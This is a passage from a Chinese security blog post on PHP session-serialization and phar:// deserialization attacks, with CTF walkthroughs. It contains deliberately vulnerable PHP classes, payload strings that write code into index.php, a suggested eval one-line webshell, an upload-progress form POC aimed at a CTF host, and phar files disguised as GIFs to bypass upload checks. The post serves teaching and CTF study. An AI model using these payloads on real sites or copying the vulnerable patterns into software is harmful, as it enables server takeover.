<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>PHP反序列化总结(二) | xiaoZ's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><meta name="generator" content="Hexo 4.1.1"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">PHP反序列化总结(二)</h1><a id="logo" href="/.">xiaoZ's Blog</a><p class="description">Try My Best</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">PHP反序列化总结(二)</h1><div class="post-meta">Jan 28, 2020<span> | </span><span class="category"><a href="/categories/Web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/">Web漏洞介绍</a></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#session序列化"><span class="toc-number">1.</span> <span class="toc-text">session序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session与cookie"><span class="toc-number">1.1.</span> <span class="toc-text">session与cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP中的session处理过程与配置"><span class="toc-number">1.2.</span> <span class="toc-text">PHP中的session处理过程与配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-session存储与处理引擎"><span class="toc-number">1.3.</span> <span class="toc-text">PHP session存储与处理引擎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-session序列化漏洞"><span class="toc-number">1.4.</span> <span class="toc-text">PHP session序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar伪协议扩展php反序列化"><span class="toc-number">2.</span> <span class="toc-text">phar伪协议扩展php反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phar协议"><span class="toc-number">2.1.</span> <span class="toc-text">phar协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar反序列化利用"><span class="toc-number">2.2.</span> <span class="toc-text">phar反序列化利用</span></a></li></ol></li></ol></div></div><div class="post-content"><p>接上一篇《PHP反序列化总结(一)》，前一篇对于序列化、PHP序列化与反序列化、PHP魔法函数、POP链进行了介绍，这篇将继续对session序列化、phar伪协议触发PHP反序列化等进行介绍。</p>
<h2 id="session序列化">session序列化</h2>
<h3 id="session与cookie">session与cookie</h3>
<p>介绍session序列化前，先对session和php中的处理机制进行介绍。首先，先区分下什么session和cookie。</p>
<p>先看session，session其实是一种存放在服务器端的用户数据，一般称为 “会话控制”，用以实现一种客户与网站/服务器的更为安全的会话方式，通过使用session来保存会话中的用户数据和会话信息，从而让服务器/网站与用户间的会话可以通过session来进行识别和保持。如果服务器或网站开启session机制，用户第一次访问网站时的流程一般是下面这样的过程：</p>
<ul>
<li>在浏览器第一次请求访问一个网页时，服务器会自动生成一个session来标识这一对话，并且声称一个session id来唯一标识这个session，且将其通过响应报文发送给用户的浏览器上，通知其在会话时需要带上这一session id;</li>
<li>浏览器收到服务器响应报文中发来的session信息，在第二次请求时，会在请求报文中带上这一session信息，一起发送给服务器端;</li>
<li>服务器收到用户的第二次请求，并从中提取出session id，与本地的id表进行对比，找到对应的session，进行下一步会话。</li>
</ul>
<p>一般情况下，服务器会在一定时间内（默认30分钟）保存这个session，过了时间限制，就会进行销毁。在销毁之前，程序员可以将用户的一些数据以Key和Value的形式暂时存放在这个session中。当然，也有使用数据库将这个session序列化后保存起来的，这样的好处是没了时间的限制，坏处是随着时间的增加，这个数据库会急速膨胀，特别是访问量增加的时候。一般还是采取前一种方式，以减轻服务器压力。</p>
<p>那么cookie又是什么？cookie和session最大的区别，在于cookie是存储在用户端的浏览器内存或者一个文本中，即不会占用服务器端的资源，使用流程和上述所说的session类似，由服务器返回给浏览器，浏览器保存，访问时带上这串数据。cookie也可以说是session对象的一种，一般用以识别用户身份和记录访问历史。</p>
<p>这里或许有人看出来，不管是session还是cookie，上述所说的服务器返回给用户浏览器，其实都是需要浏览器保存的？那又有什么区别呢？区别在于session在本地只有session id，而不会直接存储session，session是由浏览器发送id至服务器后进行查找得到的。</p>
<p>另外，这里值得说明的是，cookie因为其存储位置的原因，其安全性一直都颇具争议，其本地地可见性与可编辑性，常会引发众多安全问题，所以在使用cookie时，需要谨慎进行考虑！</p>
<h3 id="PHP中的session处理过程与配置">PHP中的session处理过程与配置</h3>
<p>在PHP中，假设此时用户执行登录操作，其session的工作流程如下所示：</p>
<ol>
<li>将本地的cookie中的session标识和用户名，密码带到后台中;</li>
<li>后台检测有没有对应的session标识，我们以php为例，那么就是检测有没有接收到对应的PHPSESSID;</li>
<li>如果没有对应的session标识，则直接生成一个新的session。有的话，检测对应的文件是否存在并且有效;</li>
<li>如果对应的session失效，则需要清除session然后生成新的session。不失效，则使用当前的session;</li>
</ol>
<p>在PHP的session处理中，有一些机制是需要进行配置的，一般配置如下：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">设置<span class="keyword">session</span>存放在cookie中中标识的字段名，php中默认为PHPSESSID;</span><br><span class="line">  对应的设置为： <span class="keyword">session</span>.name = PHPSESSID</span><br><span class="line">如果客户端禁用了cookie，可以通过设置<span class="keyword">session</span>.use_trans_sid来使标识的交互方式从cookie变为url传递;</span><br><span class="line">  对应的设置为： <span class="keyword">session</span>.use_trans_sid = <span class="number">0</span></span><br><span class="line">设置<span class="keyword">session</span>的保存位置;</span><br><span class="line">  对应的设置为： <span class="keyword">session</span>.save_path="/PHP/tmp" (这里使用的存储位置只是示例)</span><br></pre></td></tr></table></figure>
<p>这里也附上一些从网上找的其他的更为详细的配置：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">session</span>.gc_divisor</span><br><span class="line">	php <span class="keyword">session</span>垃圾回收机制相关配置</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.sid_bits_per_character</span><br><span class="line">	指定编码的会话ID字符中的位数</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.save_path=""</span><br><span class="line">	该配置主要设置<span class="keyword">session</span>的存储路径</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.save_handler=""</span><br><span class="line">	该配置主要设定用户自定义存储函数，如果想使用PHP内置<span class="keyword">session</span>存储机制之外的可以使用这个函数</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.use_strict_mode</span><br><span class="line">	严格会话模式，严格会话模式不接受未初始化的会话ID并重新生成会话ID</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.use_cookies</span><br><span class="line">	指定是否在客户端用 cookie 来存放会话 ID，默认启用</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.cookie_secure</span><br><span class="line">	指定是否仅通过安全连接发送 cookie，默认关闭</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.use_only_cookies</span><br><span class="line">	指定是否在客户端仅仅使用cookie来存放会话 ID，启用的话，可以防止有关通过 URL 传递会话 ID 的攻击</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.name</span><br><span class="line">	指定会话名以用做 cookie 的名字，只能由字母数字组成，默认为 PHPSESSID</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.auto_start</span><br><span class="line">	指定会话模块是否在请求开始时启动一个会话，默认值为 <span class="number">0</span>，不启动</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.cookie_lifetime</span><br><span class="line">	指定了发送到浏览器的 cookie 的生命周期，单位为秒，值为 <span class="number">0</span> 表示“直到关闭浏览器”。默认为 <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.cookie_path</span><br><span class="line">	指定要设置会话cookie 的路径，默认为 /</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.cookie_domain</span><br><span class="line">	指定要设置会话cookie 的域名，默认为无，表示根据 cookie 规范产生cookie的主机名</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.cookie_httponly</span><br><span class="line">	将Cookie标记为只能通过HTTP协议访问，即无法通过脚本语言（例如JavaScript）访问Cookie，此设置可以有效地帮助通过XSS攻击减少身份盗用</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.serialize_handler</span><br><span class="line">	定义用来序列化/反序列化的处理器名字，默认使用php，还有其他引擎，且不同引擎的对应的<span class="keyword">session</span>的存储方式不相同</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.gc_probability</span><br><span class="line">	该配置项与 <span class="keyword">session</span>.gc_divisor 合起来用来管理 garbage collection，即垃圾回收进程启动的概率</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.gc_divisor</span><br><span class="line">	该配置项与<span class="keyword">session</span>.gc_probability合起来定义了在每个会话初始化时启动垃圾回收进程的概率</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.gc_maxlifetime</span><br><span class="line">	指定过了多少秒之后数据就会被视为“垃圾”并被清除，垃圾搜集可能会在<span class="keyword">session</span>启动的时候开始（ 取决于<span class="keyword">session</span>.gc_probability 和 <span class="keyword">session</span>.gc_divisor）</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.referer_check</span><br><span class="line">	包含有用来检查每个 HTTP Referer的子串。如果客户端发送了Referer信息但是在其中并未找到该子串，则嵌入的会话 ID 会被标记为无效。默认为空字符串</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.cache_limiter</span><br><span class="line">	指定会话页面所使用的缓冲控制方法（<span class="keyword">none</span>/nocache/private/private_no_expire/<span class="built_in">public</span>）。默认为 nocache</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.cache_expire</span><br><span class="line">	以分钟数指定缓冲的会话页面的存活期，此设定对nocache缓冲控制方法无效。默认为 <span class="number">180</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.use_trans_sid</span><br><span class="line">	指定是否启用透明 SID 支持。默认禁用</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.sid_length</span><br><span class="line">	配置会话ID字符串的长度。 会话ID的长度可以在<span class="number">22</span>到<span class="number">256</span>之间。默认值为<span class="number">32</span>。</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.trans_sid_tags</span><br><span class="line">	指定启用透明sid支持时重写哪些HTML标签以包括会话ID</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.trans_sid_hosts</span><br><span class="line">	指定启用透明sid支持时重写的主机，以包括会话ID</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.sid_bits_per_character</span><br><span class="line">	配置编码的会话ID字符中的位数</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.upload_progress.enabled</span><br><span class="line">	启用上传进度跟踪，并填充$ _SESSION变量， 默认启用。</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.upload_progress.cleanup</span><br><span class="line">	读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.upload_progress.prefix</span><br><span class="line">	配置$ _SESSION中用于上传进度键的前缀，默认为upload_progress_</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.upload_progress.name</span><br><span class="line">	$ _SESSION中用于存储进度信息的键的名称，默认为PHP_SESSION_UPLOAD_PROGRESS</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.upload_progress.freq</span><br><span class="line">	定义应该多长时间更新一次上传进度信息</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.upload_progress.min_freq</span><br><span class="line">	更新之间的最小延迟</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.lazy_write</span><br><span class="line">	配置会话数据在更改时是否被重写，默认启用</span><br></pre></td></tr></table></figure>
<h3 id="PHP-session存储与处理引擎">PHP session存储与处理引擎</h3>
<p>默认情况下，PHP使用内置的文件会话保存管理器来完成session的保存，也可以通过配置项 session.save_handler 来修改所要采用的会话保存管理器。 对于文件会话保存管理器，会将会话数据保存到配置项session.save_path所指定的位置。而在PHP session序列化漏洞中，主要涉及的是session.serialize_handler配置项。</p>
<p>刚刚有说过session是存储在服务器端中的，默认是使用文件的形式进行存储，且存储的文件是由sess_sessionid来决定文件名，当然这个文件名也不是不变的，如Codeigniter框架的session存储的文件名为ci_sessionSESSIONID。在文件中，存储的session是以session的序列化值的形式存在。而对于存储的session序列化形式数据来说，使用的序列化处理器不同会导致序列化处理后的结果不同，其处理器的选择有上述所说的session_serialize_handler来定义，不同的处理器及其格式如下表所示：</p>
<table>
<thead>
<tr>
<th>处理器</th>
<th>序列化格式</th>
</tr>
</thead>
<tbody>
<tr>
<td>php</td>
<td>session名 +</td>
</tr>
<tr>
<td>php_binary</td>
<td>session名长度对应的ascii码转为的字符 + session名 + 经过PHP serialize()函数序列化处理后的字符串</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过PHP serialize()函数序列haul处理后的字符串</td>
</tr>
</tbody>
</table>
<p>下面看下这三个不同的序列化处理器的使用示例，假设传入的数据为’xiaoZisacaiji’：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.php处理器</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php'</span>);		<span class="comment">//设置php序列化处理器</span></span><br><span class="line">session_start();		<span class="comment">//session开始</span></span><br><span class="line">$_SESSION[<span class="string">'session_php'</span>] = $_GET[<span class="string">'session'</span>];		<span class="comment">//获取用户传来的session信息</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化处理后结果：</span></span><br><span class="line">session_php|s:<span class="number">13</span>:<span class="string">"xiaoZisacaiji"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//其中session为session名，| 后为get传过来的session信息经过序列化的结果</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.php_binary处理器</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_binary'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'session_php_binary_test_test_test_test'</span>] = $_GET[<span class="string">'session'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化处理后结果:</span></span><br><span class="line">&amp;session_php_binary_test_test_test_test:s:<span class="number">13</span>:<span class="string">"xiaoZisacaiji"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//其中，因为session_php...test字符长度为38，则对应ascii码的字符为 &amp;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.php_serialize处理器</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'session'</span>] = $_GET[<span class="string">'session'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">序列化处理后结果为：</span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">"session"</span>;s:<span class="number">13</span>:<span class="string">"xiaoZisacaiji"</span>&#125;</span><br></pre></td></tr></table></figure>
<p>说到这里，还是和之前讨论序列化一样的思路，服务器会读取并使用发送过去的session信息，那么是否可以在用户端进行修改，传入特定的session信息，从而传入一些可被利用的后门或者其余恶意代码，从而达到攻击目的呢？答案是，可以的！如果网站序列化并存储session与反序列化并读取session的方式不同，就可能导致漏洞的产生。</p>
<h3 id="PHP-session序列化漏洞">PHP session序列化漏洞</h3>
<p>这里直接结合一个漏洞实例来进行讲解，下面是示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//存储session页面 session.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'session'</span>] = $_GET[<span class="string">'session'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//漏洞页面 test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xiaoZ</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $fp = fopen(<span class="string">"../WWW/test/index.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">        fputs($fp,<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过session.php可以进行session信息的传入和存储，后面的test则是对序列化结果进行处理，由上述看到的两种php session处理器的处理不同可得，如果在签名传入一个包含 ‘|’ 符合的session信息，则在服务器对session信息进行处理时，新的序列化处理反格式会将 ‘|’ 后的值当成session的key值再进行序列化，从而将这一个类进行序列化，由此，在这里我们可以传入poc，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//session.php页面传入</span></span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">"session"</span>;s:<span class="number">50</span>:<span class="string">"|O:5:"</span>xiaoZ<span class="string">":1:&#123;s:1:"</span>a<span class="string">";s:17:"</span><span class="meta">&lt;?php</span> phpinfo()<span class="meta">?&gt;</span><span class="string">";&#125;"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//test.php页面处理后</span></span><br><span class="line">a = <span class="string">'&lt;?php phpinfo()?&gt;'</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">//即后续服务器对session进行处理时，会将phpinfo() 信息写入到上述test.php中的 "../WWW/test/index.php" 中。</span></span><br></pre></td></tr></table></figure>
<p>上述示例中，只是传入一个phpinfo()，那么如果是传入一句话木马的话，则可以getshell了。比如将上述session.php页面的poc中的 “<?php phpinfo()?>” 修改为 “<?php eval(@$_POST['a']);?>”，即可将一句话木马写入到 ‘index.php’ 中。</p>
<p>再看一个示例，该示例为jarvisoj-web中的一道(session反序列化题)[<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a>]，题目给出了 index.php 源码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//A webshell is wait for you</span></span></span><br><span class="line"><span class="php">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $mdzz;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $m = <span class="keyword">new</span> OowoO();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>可以看到这里设置的php session处理器为php，另外通过get传入phpinfo时，会将OowoO这个类进行实例化并访问phpinfo()。这个例题中，还使用了另一个php session的配置——session.upload_progress.enabled(PHP BUG #71101)，该配置用于检测文件上传的进度，在配置为on时，如果在一个文件上传的同时post一个与session.upload_progress.name同名的变量，则PHP会在$_SESSION中添加一条数据。而我们则可以利用这一点来对session进行设置。下面poc来源于网络：</p>
<p>列出当前目录：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">&lt;form action="http://web.jarvisoj.com:32784/index.php" <span class="keyword">method</span>="POST" enctype="multipart/form-data"&gt;</span><br><span class="line">    &lt;<span class="keyword">input</span> <span class="keyword">type</span>="hidden" <span class="type">name</span>="PHP_SESSION_UPLOAD_PROGRESS" <span class="keyword">value</span>="|O:5:"OowoO":1:&#123;s:4:"mdzz";s:26:"print_r(scandir(__dir__));";&#125;" /&gt;</span><br><span class="line">    &lt;<span class="keyword">input</span> <span class="keyword">type</span>="file" <span class="type">name</span>="file" /&gt;</span><br><span class="line">    &lt;<span class="keyword">input</span> <span class="keyword">type</span>="submit" /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>上传该poc后，在原本应该返回的phpinfo页面中会出现当前路径的信息，由此可以找到flag文件，直接读取即可：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">|<span class="string">O:</span><span class="number">5</span>:<span class="string">"OowoO"</span>:<span class="number">1</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"mdzz"</span>;<span class="string">s:</span><span class="number">88</span>:<span class="string">"print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>由此可以得到flag。</p>
<p>另外提供一个示例，这是2019巅峰极客大赛的web题——lol，这道题目一样利用了php session反序列化漏洞及PHP BUG #71101。其源码环境可到<a href="https://github.com/xiaoZ-hc/Vulnerability-Repository/tree/master/2019%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2_web_lol_%E6%BA%90%E7%A0%81" target="_blank" rel="noopener">此处</a>下载</p>
<h2 id="phar伪协议扩展php反序列化">phar伪协议扩展php反序列化</h2>
<h3 id="phar协议">phar协议</h3>
<p>在之前对SSRF的介绍中，有过对一些协议（file://、php://等）的介绍，现在需要介绍的是另外一个协议，phar伪协议。该协议也是一种流包装器，主要是用于进行文档的压缩，可以将多个文件归档到同一个文件中，并且能够不经过解压就被php访问并执行，或许可以将其名称进行拆分 “php + tar” 更容易理解？</p>
<p>在php文档中，对于phar的结构进行了规定，其结构由以下四部分组成：</p>
<ul>
<li>stub phar 文件标识，格式为 xxx<?php xxx; __HALT_COMPILER();?>；</li>
<li>manifest 压缩文件的属性等信息，以序列化存储；</li>
<li>contents 压缩文件的内容；</li>
<li>signature 签名，放在文件末尾；</li>
</ul>
<p>其中文件标识必须以__HALT_COMPILER();?&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制。另外，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多。</p>
<p>看一个创建phar文件的示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//phar.phar</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">  	&#125;</span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">	$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); 					<span class="comment">//后缀名必须为phar</span></span><br><span class="line">	$phar-&gt;startBuffering();</span><br><span class="line">	$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); 	<span class="comment">//设置stub</span></span><br><span class="line">	$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">	$o -&gt; data=<span class="string">'xiaoZisacaiji'</span>;</span><br><span class="line">	$phar-&gt;setMetadata($o); 						<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">	$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); 		<span class="comment">//添加要压缩的文件</span></span><br><span class="line">													<span class="comment">//签名自动计算</span></span><br><span class="line">	$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过上述代码，则可以创建出一个phar文件，通过hexo打开，可以看到其中最开始的字段为 “&lt;?php _HALT_COMPILER();” ，而中间数据中则包含有上述对象序列化后的数据字段。这里的phar文件中，最开始的字段是可以自行构造的，也就是上述介绍中所说的，可以利用这样的特点，伪造一个图片或者pdf文件来绕过一些上传限制，如只需要将上述代码改为如下所示即可将phar文件伪造为图片：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//phar.phar</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">	$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);				<span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">	$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">	$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">	$o -&gt; data=<span class="string">'xiaoZisacaiji!!!'</span>;</span><br><span class="line">	$phar-&gt;setMetadata($o); 					<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">	$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);	<span class="comment">//添加要压缩的文件</span></span><br><span class="line">												<span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过上面这个例子，是否可以看到和之前所述漏洞利用的相同点？利用在序列化和反序列化中的不同，构造数据传入，从而达成攻击的目的？</p>
<h3 id="phar反序列化利用">phar反序列化利用</h3>
<p>一样的，利用几个示例来进行理解，示例一（来源2018柏鹭杯 web2-Phar)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test1.php</span></span><br><span class="line"><span class="comment">//该段代码只是漏洞利用处的代码，另外有一处文件上传点，但是限制文件上传类型为gif图片</span></span><br><span class="line"><span class="comment">//另外，该文件上传点未对上传的文件内容进行校验</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">	$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">		<span class="keyword">var</span> $output = <span class="string">'echo "hahaha";'</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	file_exists($filename);</span><br><span 